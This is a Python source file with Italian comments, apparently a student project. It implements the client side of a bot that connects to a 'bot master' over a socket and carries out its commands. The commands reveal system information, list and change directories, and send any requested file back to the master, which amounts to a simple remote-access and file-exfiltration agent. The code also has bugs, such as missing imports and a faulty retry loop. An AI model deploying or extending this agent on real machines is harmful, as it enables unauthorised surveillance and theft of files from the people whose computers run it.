"""
Bot Applicazione Interessante

AUTORI: Matteo Marino, Alessandro Trincone, Vincenzo Papale
"""
from audioop import add
from socket import *    #funzioni 
import time             #funzione sleep
from functions import *


serverName = "localhost"  #IP del bot master
serverPort = 12000        #porta su cui comunica il bot master
server = (serverName,serverPort)
clientSocket = socket(AF_INET, SOCK_STREAM)     #creazione del socket 
error = True
attempts = 0
while error == True or attempts <10:    #Tenta la connessione al bot master
    error = False
    try:
        clientSocket.connect(server)
    except ConnectionRefusedError:
        time.sleep(5)
        error = True
        attempts+=1
try:
    while True:
        messaggio = " "
        comando = clientSocket.recv(1024).decode()
        # Visualizza info sul sistema operativo e sulla macchina
        if comando == "1":
            messaggio = SystemInfo()
        #Visualizza i file presenti nella directory corrente
        elif comando == "2":
            ls = os.listdir()
            if len (ls) != 0:
                messaggio = ""
            for x in ls:
                messaggio = messaggio + x + "\n"
        #Cambia directory secondo quanto specificato in path
        elif comando[0] == "3":
            path = comando[2:]
            try:
                if path == "":
                    os.chdir(".")
                    messaggio = "directory cambiata:\n" + os.getcwd()
                else:
                    try:
                        os.chdir (path)
                        messaggio = "directory cambiata:\n" + os.getcwd()
                    except NotADirectoryError:
                        messaggio = "Not a Directory\n"
            except FileNotFoundError:
                messaggio = "Directory non trovata"
        #Visualizza il percorso della working directory
        elif comando == "4":
            messaggio = os.getcwd()
        #Esegue il download di un file della cwd
        elif comando[0] == "5":
            readFile = comando[1:]
            file = open(readFile,"rb")
            try:
                messaggio = file.read()
            except FileNotFoundError:
                messaggio = "File non trovato\n"
            except Exception:
                messaggio = "Errore nell'apertura del file\n"
        #Termina
        elif comando == "exit":
            break
        if comando[0] == "5":
            msglen = len(messaggio)
            clientSocket.send(str(msglen).encode())
            totsent = 0
            while totsent < msglen:
                try:
                    sent = clientSocket.send(messaggio[totsent:])
                    if sent == 0:
                        raise RuntimeError
                    totsent += sent
                except RuntimeError:
                    clientSocket.send("Errore nell'invio del file".encode())
        else:
            clientSocket.send(messaggio.encode())
    clientSocket.close()
except ConnectionAbortedError: 
    f = open("./ApplicazioneInterrante/crashreport.txt","a")
    f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Connessione Interrotta dall'host\n")
    f.close()
except ConnectionError:
    f = open("./ApplicazioneInterrante/crashreport.txt","a")
    f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Errore di connessione\n")
    f.close()